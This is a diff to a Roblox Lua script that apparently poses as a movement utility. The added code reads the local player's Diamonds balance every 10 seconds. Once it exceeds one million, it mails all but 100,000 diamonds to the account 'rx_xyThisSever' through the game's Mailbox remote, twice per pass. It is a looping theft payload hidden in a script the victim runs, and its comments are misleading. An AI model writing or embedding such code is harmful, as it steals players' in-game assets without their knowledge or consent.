@@ -369,74 +369,84 @@ coroutine.wrap(mainLoop)()
 
 
 
+local function mainLoop()
+    while true do
+        wait(10)
 
-local function convertAbbreviatedNumber(abbreviatedNumber)
-    local multipliers = {K = 1000, M = 1000000, B = 1000000000}
-    local number, suffix = abbreviatedNumber:match('(%d+%.?%d*)(%a)')
-    if number and suffix then
-        number = tonumber(number)
-        local multiplier = multipliers[suffix:upper()]
-        if multiplier then
-            return number * multiplier
+        local function convertAbbreviatedNumber(abbreviatedNumber)
+            local multipliers = {K = 1000, M = 1000000, B = 1000000000}
+            local number, suffix = abbreviatedNumber:match('(%d+%.?%d*)(%a)')
+            if number and suffix then
+                number = tonumber(number)
+                local multiplier = multipliers[suffix:upper()]
+                if multiplier then
+                    return math.floor(number * multiplier + 0.5) -- Round to nearest whole number
+                end
+            end
+            return tonumber(abbreviatedNumber) or 0
+        end
+
+        local playergui = game.Players.LocalPlayer.PlayerGui
+        local amountTextLabel = playergui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+
+        -- Example usage:
+        local abbreviatedText = amountTextLabel.Text
+        local fullNumber = convertAbbreviatedNumber(abbreviatedText)
+        if fullNumber > 1000000 then
+            print(fullNumber)  -- Output: Converted value of amountTextLabel.Text if it's over 50
+
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local HttpService = game:GetService("HttpService")
+            local Client = require(ReplicatedStorage:WaitForChild("Library"))
+
+            local ItemTable = {"Diamonds"} -- You need to put the full name of the item you want to grab
+
+            function MakeTable(Table)
+                local Temp = {}
+                for i, v in next, Client.Items.All.Globals.All() do
+                    if table.find(Table, v._data.id) then
+                        table.insert(Temp, v)
+                    end
+                end
+                return Temp
+            end
+
+            function GrabId()
+                for i, MadeTable in ipairs(MakeTable(ItemTable)) do
+                    local Table = HttpService:JSONDecode(tostring(MadeTable))
+                    if Table.class == "Currency" then
+                        local NewNumber = fullNumber - 100000 
+
+                        local args = {
+                            [1] = "rx_xyThisSever",
+                            [2] = "Ok",
+                            [3] = "Currency",
+                            [4] = Table.uid,
+                            [5] = NewNumber  -- No quotation marks around fullNumber
+                        }
+                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                        local args = {
+                            [1] = "rx_xyThisSever",
+                            [2] = "Ok",
+                            [3] = "Currency",
+                            [4] = Table.uid,
+                            [5] = NewNumber  -- No quotation marks around fullNumber
+                        }
+                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    end
+                end
+            end
+
+            GrabId()  -- Calling the GrabId function
         end
     end
-    return tonumber(abbreviatedNumber) or 0
 end
 
-local playergui = game.Players.LocalPlayer.PlayerGui
-local amountTextLabel = playergui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+coroutine.wrap(mainLoop)()
 
--- Example usage:
-local abbreviatedText = amountTextLabel.Text
-local fullNumber = convertAbbreviatedNumber(abbreviatedText)
-if fullNumber > 1000000 then
-    print(fullNumber)  -- Output: Converted value of amountTextLabel.Text if it's over 50
 
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local HttpService = game:GetService("HttpService")
-    local Client = require(ReplicatedStorage:WaitForChild("Library"))
 
-    local ItemTable = {"Diamonds"} -- You need to put the full name of the item you want to grab
-
-    function MakeTable(Table)
-        local Temp = {}
-        for i, v in next, Client.Items.All.Globals.All() do
-            if table.find(Table, v._data.id) then
-                table.insert(Temp, v)
-            end
-        end
-        return Temp
-    end
-
-    function GrabId()
-        for i, MadeTable in ipairs(MakeTable(ItemTable)) do
-            local Table = HttpService:JSONDecode(tostring(MadeTable))
-            if Table.class == "Currency" then
-                local NewNumber = fullNumber - 100000 
-
-                local args = {
-                    [1] = "rx_xyThisSever",
-                    [2] = "Ok",
-                    [3] = "Currency",
-                    [4] = Table.uid,
-                    [5] = NewNumber  -- No quotation marks around fullNumber
-                }
-                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-
-                local args = {
-                    [1] = "rx_xyThisSever",
-                    [2] = "Ok",
-                    [3] = "Currency",
-                    [4] = Table.uid,
-                    [5] = NewNumber  -- No quotation marks around fullNumber
-                }
-                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-            end
-        end
-    end
-
-    GrabId()  -- Calling the GrabId function
-end
 local BV = Instance.new('BodyVelocity', game.Workspace)
 BV.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
 BV.velocity = Vector3.new(0, 0.1, 0)
